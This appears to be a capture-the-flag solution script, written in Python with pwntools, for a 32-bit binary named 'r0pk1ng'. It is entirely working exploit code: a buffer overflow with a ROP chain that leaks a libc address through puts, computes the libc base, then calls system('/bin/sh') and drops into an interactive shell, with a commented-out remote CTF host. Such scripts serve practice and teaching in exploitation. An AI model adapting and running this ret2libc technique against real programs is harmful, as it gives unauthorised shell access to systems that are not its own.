#!/usr/bin/env python3



from pwn import *

e = ELF("./r0pk1ng")
r = process("./r0pk1ng")
#r = remote("gc1.eng.run",30386)
#libc = ELF("./libc6-i386_2.31-0ubuntu9.2_amd64.so")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
exploit  = b"A" * 36 + p32(e.plt.puts) + p32(e.sym.main) + p32(e.got.gets) 
r.sendline(exploit)
r.recvuntil(b"Can you out ROP the r0pk1ng?")
leak = u32(r.recvuntil(b"\xf7").strip().decode('latin-1').ljust(4,'\x00'))
libc_base = leak - libc.sym.gets
print(hex(libc_base))
exploit = b"A" * 36 + p32(libc_base + libc.sym.system) + p32(0) + p32(libc_base + next(libc.search(b"/bin/sh\x00")))
r.sendline(exploit)
r.interactive()
